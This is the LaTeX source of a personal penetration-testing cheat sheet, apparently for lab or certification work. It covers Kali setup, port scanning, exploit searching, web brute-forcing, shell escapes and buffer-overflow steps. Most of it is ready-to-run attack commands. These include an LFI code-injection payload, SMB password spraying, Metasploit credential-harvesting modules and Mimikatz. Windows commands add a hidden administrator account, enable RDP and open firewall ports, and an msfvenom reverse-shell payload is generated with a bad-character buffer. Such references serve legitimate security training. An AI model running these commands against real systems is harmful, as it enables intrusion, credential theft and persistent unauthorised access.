\documentclass[a4paper,12pt, twoside,]{report}
\usepackage[utf8x]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{palatino}
\linespread{1.32}
\usepackage{microtype}
\usepackage[english]{babel}
%Erweiterte Zitierbefehle
\usepackage{natbib}
%Bessere Graphik bei Eingabe von urls mit \url{}
\usepackage{url}
\usepackage{lastpage}
%code
\usepackage{listings}
\usepackage{environ}
\usepackage{etoolbox}
%Bessere Farben und Textunterstreichungenetc

\usepackage{soul}

%Bietet einen \floatbarrier Befehl um Bilder abzufangen.
\usepackage{placeins}
%folgende Zeilen sind für Kapitelüberschriften
\usepackage[rigidchapters]{titlesec}
\usepackage{blindtext}
\titleformat{\chapter}
{\normalfont\LARGE}
{\makebox[3pc][l]{\LARGE\thechapter\hfil\rule[-6pt]{0.5pt}{2pc}}}
{0pt}
{\LARGE}
\titlespacing*{\chapter}{0pt}{0pt}{82pt}

%Csv -> Latex
\usepackage{csvsimple}

%Für Graphiken 
\usepackage{tikz}
\usetikzlibrary{plotmarks}
\usetikzlibrary{positioning,shapes,shadows,arrows}
\usepackage{graphicx}

%Paket gibt einige Optionen mehr bei Tabellen (wird eher nicht verwendet)
\usepackage{array}
%Seitenränder definieren
\usepackage[right=4.0cm,left=3.3cm, bottom=3.9cm, top=4.1cm, footskip=2.1cm, headsep=2.0cm]{geometry}
%\usepackage{stdpage}
%test wegen anzahl zeilen pro seite
%Paket für Zeilenabstände
\usepackage{setspace}
%\onehalfspacing
\usepackage{multirow}
%Paket gibt mehr Kontrolle über die Captions (Bildunterschriften) bei Abbildungen
\usepackage[labelfont=bf,format=hang,font=footnotesize,justification=raggedright,singlelinecheck=false]{caption}

%Helvetia (Arial) Verwenden WICHTIG: Beide folgenden Zeilen kopieren!
%\usepackage[scaled]{helvet} %
%\renewcommand*\familydefault{\sfdefault} %%

% Abschalten des Einrückens bei neuen Absätzen (manuell, nach Tabellen, Abbildungen, etc.)
\setlength{\parindent}{0pt}
\hyphenation{}


\usepackage{fancyhdr}
\pagestyle{fancy}
\fancyhf{}
\fancyfoot{} % clear all footer fields
\fancyfoot[RO]  {\vline  \textcolor{color1}\thepage  \textcolor{color2}{/\pageref{LastPage}}}
\fancyfoot[LE]{\textcolor{color1}\thepage  \textcolor{color2}{/\pageref{LastPage}}  \vline }
%\fancyhead[RO]{\scriptsize \rightmark \small{Lab Report Sven Uckermann}}
%\fancyhead[LE]{\scriptsize \leftmark \small{Lab Report Sven Uckermann}}




%\fancyfoot[]{\thepage}
%\renewcommand{\footrulewidth}{0.4pt}


%\pagestyle{fancy}
%\renewcommand{\chaptermark}[1]{\markboth{\thechapter.\ #1}{}}
\usepackage{color}

\definecolor{color0}{rgb}{0,0,0}% black
\definecolor{color1}{rgb}{0.22,0.45,0.70}% light blue
\definecolor{color2}{rgb}{0.45,0.45,0.45}% dark grey
\definecolor{mygreen}{rgb}{0,0.6,0}
\definecolor{mygray}{rgb}{0.5,0.5,0.5}
\definecolor{myblue}{rgb}{0.0, 0.53, 0.74}
\definecolor{codebackground}{rgb}{0.8, 0.8, 0.8}
\definecolor{codechanged}{rgb}{0.8, 0.0, 0.0}

\lstset{ %
  backgroundcolor=\color{codebackground},   % choose the background color; you must add \usepackage{color} or \usepackage{xcolor}
  basicstyle=\footnotesize,        % the size of the fonts that are used for the code
  breakatwhitespace=false,         % sets if automatic breaks should only happen at whitespace
  breaklines=true,                 % sets automatic line breaking
  captionpos=b,                    % sets the caption-position to bottom
  commentstyle=\color{mygreen},    % comment style
  deletekeywords={...},            % if you want to delete keywords from the given language
  escapeinside={\%*}{*)},          % if you want to add LaTeX within your code
  extendedchars=true,              % lets you use non-ASCII characters; for 8-bits encodings only, does not work with UTF-8
 % frame=single,	                   % adds a frame around the code
literate=*{-}{-}1,   %no whitespaces
  keepspaces=true,                 % keeps spaces in text, useful for keeping indentation of code (possibly needs columns=flexible)
 % keywordstyle=\color{blue},       % keyword style
  %language=Octave,                 % the language of the code
  %otherkeywords={*,...},           % if you want to add more keywords to the set
  numbers=left,                    % where to put the line-numbers; possible values are (none, left, right)
  numbersep=5pt,                   % how far the line-numbers are from the code
  numberstyle=\tiny\color{mygray}, % the style that is used for the line-numbers
  rulecolor=\color{black},         % if not set, the frame-color may be changed on line-breaks within not-black text (e.g. comments (green here))
  %showspaces=false,                % show spaces everywhere adding particular underscores; it overrides 'showstringspaces'
  showstringspaces=false,          % underline spaces within strings only
  showtabs=false,                  % show tabs within strings adding particular underscores
  stepnumber=2,                    % the step between two line-numbers. If it's 1, each line will be numbered
  %stringstyle=\color{mymauve},     % string literal style
  tabsize=2,	                   % sets default tabsize to 2 spaces
 % title=\lstname,                   % show the filename of files included with \lstinputlisting; also try caption instead of title
	moredelim=**[is][\color{codechanged}]{**@}{@**}, %Rot für Änderungen
		moredelim=**[is][\color{myblue}]{***@}{@***}, %einfaches blau
	moredelim=**[is][\color{mygreen}]{*@}{@*},%einfaches Grün
}

%Aktives Inhaltsverzeichnis und links
\usepackage{hyperref}
\hypersetup{
    colorlinks,
    citecolor=black,
    filecolor=black,
    linkcolor=black,
    urlcolor=black
}
\usepackage{longtable}
\begin{document}
\newcommand{\vers}{1.5} 
\fancypagestyle{plain}{}






\fancyhead[R]{\scriptsize{UMPF \vers}}
\title{U.M.P.F}
\date{\today}
\author{Ucki's Manual for Penetrationtests and Fieldwork V.\vers \\ \tiny{Or the Sound I make when my Kali VM dies again}}
\maketitle

\tableofcontents
\newpage



%------------------------------------Start--------------------------------------------------------------------

\section{Kali VM Prepsheet}
\subsection{Basic System Prep}
\begin{lstlisting}[caption={Prepping a fresh KaliVM},label=Kaliprep]
***@Change Keylayout !!!@***
-> click on the right little icon for settings -> language settings -> add german keyboard, delete english keyboard
*@Changing password@*
passwd

***@Getting additional packets:@***
*@Update the repro list@*
apt-get update
*@Support for 32/64 compiling etc@*
apt-get install gcc-multilib
*@XML-Tools to use searchsploit with nmap xml outputs@*
apt install -y libxml2-utils
*@Unicornscan, just to make sure that this is the newest@*
apt-get install unicornscan
*@Better VM feeling@*
apt -y -qq install open-vm-tools-desktop fuse
apt -y -qq install virtualbox-guest-x11
*@Getting Gobuster@*
apt-get install gobuster
*@Getting new exploits and the nmap search function@*
apt-get install exploitdb
*@Getting Autokey so we can set own ip etc to a hotkey@*
apt-get install autokey-gtk



*@Changing Nikto User Agent to be more sneaky:@*
gedit /etc/nikto.conf 
-> change User Agent to: USERAGENT=Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko  ***@IE 11, or google your own string @***
\end{lstlisting}
\newpage
\subsection{Basic System Services}
\begin{lstlisting}[caption={Prepping a fresh KaliVM-2- Setting up basic Services},label=Kaliprep2]
*@Setting up metasploit database@*
systemctl start postgresql
systemctl enable postgresql
***@In msfconsole@***
msfdb init
msfdb start

*@MSF update@*
msfupdate

*@Setting up Tftp (needs write righs on folder for uploads@*
**@Tftp needs to be started when needed, not on systemstart atm@**
mkdir /tftp
chmod -R 0777 /tftp
atftpd --daemon --port 69 /tftp

*@Apache without php@*
/usr/sbin/a2dismod php5
service apache2 restart

\end{lstlisting}
\newpage
\subsection{Additional Tools}
\begin{lstlisting}[caption={Prepping a fresh KaliVM-3 - Getting Tools},label=Kaliprep3]
*@Getting some tools for post exploitation work@*
cd /var/www/html
mkdir tools
cd tools

***@Linux Exploit suggestor, new version THX mzet and pbateman @***
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
mv linux-exploit-suggester.sh linex
***@for version x locally@*** /linex -k 3.0.0


***@Unix Priv. checker, the smaller version, less to transfer but finds less@***
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check
mv unix-privesc-check unixpriv

\end{lstlisting}


% -g 90% für 90 % screensize rdesktop
%-------------------------------------COMMANDS-------------------------------------------------------------------------
\section{Commands}
\subsection{general Commands and random snipplets}
\begin{lstlisting}[caption={commands},label=com]
*@List all msfvenom payloads@*
msfvenom -l payloads

*@Scanning@*
unicornscan -msf <IP>:a > nametcp.txt
unicornscan -mU <IP>:a > nameudp.txt

**@bluesquirrelscan@**
unicornscan -msf -R1 -L10 -p1-65535 -r 300 $1 
**@-msf = mode tcp connect scan
-R = Repeats .. more is more accurate
-L timeout time
-r rate 300 packets per minute
-E error processing@**

***@-E = Error handling = show also closed ports, -mU = UDP, a LOT faster as nmap@***
cat name* | grep open
*@Bad way to get all ports in a line, I know awk etc would be better, but this is better than typing manual so ...@*
cat name*.txt |cut -d "[" -f 2 |cut -d "]" -f1 |sed 's/^ *//g' |tr "\n" ","
***@sed used to get rid of leading whitespaces, tr to get rid of the newline and put in a ,@***



***@Now we can use nmap a little more precise@***
nmap -sS -sU -sV --reason -vv -O --script vuln,default -p port1,port2 etc  <ip> -oA <name>
***@-sS = Tcp, -sU Udp, -sV Version scan (for heavy version scan --version-all ), vv= very verbose,-O = OS Detection, scripts vuln checks and default scans and finally generate all outputs we might need@***

*@Easy searchsploit for the low hanging fruits@*
searchsploit --nmap *.xml

*@Searchsploit@*
searchsploit <string> | grep -v '/dos/' ***@G0tm1lks way to exclude DoS exploits@***
searchsploit -t <string> ***@Search only in exploit titel@***
***@ --colour turns of highlighting to make grebbing easier@***

*@Banner grabbing for websites@*
 curl -i <ip>
 curl -i -L <ip>
***@-s for silent mode, better if you want to save it to file >name.txt@***

*@Looking at a webpage from the shell@*
curl <ip> -s -L | html2text -width '99' | uniq

**@ROBOTS.TXT CHECK !!!!!!!!@**
curl <ip>/robots.txt -s | html2text

*@Web bruteforcing, wordlist need to be changed depending on the services@* 
**@Look into /usr/share/seclists/Discovery/Web_Content/@**
gobuster -u http://***@<ip>@***/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
                                                                                                                           
*@Rdesktop all the things@*
rdesktop -u ***@user@*** -p ***@password \$ if you want $ etc@*** <IP>

*@John stand alone:@*
john hashdump --wordlist /usr/share/wordlists/rockyou.txt

*@Redirecting output from the error to the default output, usefull if you  don't see a output in a remote executed command@*
 2>&1
***@to test put the command localy with >/dev/null .. if there is a output than this is not your error@***

*@Escaping Shell HELL@*
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i



*@fun snippet - pipe a remote machine's live tcpdump into your local wireshark@*
ssh root@HOST tcpdump -U -s0 -w - 'not port 22' | wireshark -k -i -

*@ Fun with remote shares@*
showmount -e <ip> for nfs shares etc

*@flag for compiling for 64bit on 32bit kali with gcc@*
-m64

*@Don't know why but this might give you command execution if you have lfi@*
Curl -s --data "<?system (<'cmd'>);?>" LFI=php://input%00

*@Reading SSL certs, might leak information@*
openssl s_client -connect {HOSTNAME}:{PORT} -showcerts

*@To slow to type your commands in a nc listener ?@*                                                              
cat privesccore.txt | nc -lvp 443

*@Alternate php shell@*
/usr/share/laudanum/php/php-reverse-shell.php
\end{lstlisting}

\subsection{Metasploit}
\begin{lstlisting}[caption={Metasploit},label=msf]

*@To make a session more stable @*
set Autorunscript post/windows/manage/migrate

*@Importing Nmap into Metasploit@*
db_import *.xml

*@SMB login spray and pray@*
use auxiliary/scanner/smb/smb_login  
set SMBDomain DOMAIN 
set SMBUser user
set SMBPass password
services -p 445 -R  
run 

*@Running john in msfconsole against found hashes@*
use auxiliary/analyze/jtr_crack_fast 
run

*@Good post modules to run on windows@*
run post/windows/gather/credentials/credential_collector
run post/windows/gather/credentials/gpp
run post/windows/gather/enum_ms_product_keys
 ***@In the real world there is no proof.txt, this is a good secret proof for a machine without putting secret data of your client in the report@***

*@Mimikatz@*
load mimikatz
 msv
kerberos

\end{lstlisting}
\newpage
\subsection{Windows Help}
\begin{lstlisting}[caption={Windows commands},label=wincommands]
*@Long File/Foldernames@*
***@More than 8 characters are a problem@***
cd "Documents and Settings"
This is a really long filename.123.456.789.txt 
-> Thisis~1.789
More under : 
https://support.microsoft.com/en-us/help/142982/how-windows-generates-8.3-file-names-from-long-file-names


*@Activating Rdesktop from a win shell@*
net user /add ucki ucki
net localgroup administrators ucki /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f 
sc config TermService start= auto 
net start Termservice
netsh.exe firewall add portopening TCP 3389 "Rm"
netsh.exe firewall add portopening TCP 443 "NC"

*@Checking a service@*
sc qc <servicename>


*@sc qc to check a service , net start to show all service@*

*@For good Systemoverview@*
Systeminfo
\end{lstlisting}


\newpage
\section{Buffer help}
\begin{enumerate}
	\item Attach Debbuger
	\item Launch POC and look what happens
	\item Pattern create -> find Offset
	\item Test Offset with unique string (remember it reads backwards)
	\item Look for Space -> if 400 Bytes after EIP you are good, otherwise look if other registers point to a place before the EIP were you can write (Double click n Dump address)
	\item Find Bad chars
	\item Search JMP ESP without protection (!mona modules)
	\item Test the JMP with Breakpoint
	\item Build Payload and test it (Don't forget your nops)
\end{enumerate}
\newpage
\subsection{commands}
\begin{lstlisting}[caption={BOF Commands},label=bof1]
*@Creating: (Depending on MSF Version)@*
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <length> >pattern.txt
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length> >pattern.txt
*@Finding:(Depending on MSF Version)@*
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb  <value in EIP> <length>
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <value in EIP>

*@Mona@*
!mona modules
!mona find -s "\xff\xe4" -m <dll or so to search in>
***@FFE4 = "JMP ESP"@***
***@Remember the Big Endian / Low Endian Thing !!!@***

*@Shellcode@*
 msfvenom -p windows/shell_reverse_tcp LHOST=**@<ip>@** LPORT=443 -f c -e x86/shikata_ga_nai -b "***@<badchars>@***" EXITFUNC=thread>shellcode.txt
\end{lstlisting}
\subsection{Badcharbuffer}
\begin{lstlisting}[caption={Bad char buffer},label=bad]
badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
\end{lstlisting}
\end{document}
